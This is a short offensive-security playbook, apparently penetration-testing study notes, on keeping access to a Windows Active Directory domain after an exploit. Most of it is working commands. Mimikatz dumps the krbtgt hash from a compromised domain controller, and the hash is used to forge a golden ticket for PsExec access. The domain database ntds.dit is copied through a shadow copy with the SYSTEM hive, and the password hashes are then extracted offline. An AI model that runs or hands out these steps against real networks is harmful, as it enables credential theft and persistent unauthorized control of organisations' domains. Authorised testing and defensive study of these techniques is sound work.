After an exploit, to maintain a session once rebooted, changed credentials, etc.. we can craft custom golden tickets.

### Golden Tickets

First we start Mimikatz to dump the NTLM HASH for the `krbtgt` account along with the Domain SID on the **exploited Domain Controller**.

```powershell
privilege::debug
lsadump::lsa /patch
```

Then we purge the credentials and craft the golden ticket for our current user, on the target machine, even if the machine is outside of the domain.

```powershell
kerberos::purge
kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:S-1-5-21-xxxxxx-xxxxx-xxxxx /krbtgt:<HASH> /ptt
misc::cmd
```

Now we have a golden ticket associated with the user session. Once the cmd shell is open we can run with `PsExec` the commands on the Domain Controller using our user that has the golden ticket.

```powershell
PsExec.exe \\dc1 cmd.exe
```

### Shadow Copies

This is a Microsoft's backup technology to perform snapshots of data. The utility is [VShadow Tool and Sample](https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample). We run the command with

```powershell
vshadow.exe -nw -p  C:
```

We must save the shadow device name to reuse it when we save the backup on the C:\ disk.

```powershell
copy \\?\GLOBALROOT\Device\<NAM>\windows\ntds\ntds.dit c:\ntds.dit.bak
```

As the last thing we save the Windows Registry hive.

```powershell
reg.exe save hklm\system c:\system.bak
```

We can then extract back the data on the Kali machine providing the ntds database and the hive.

```shell
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```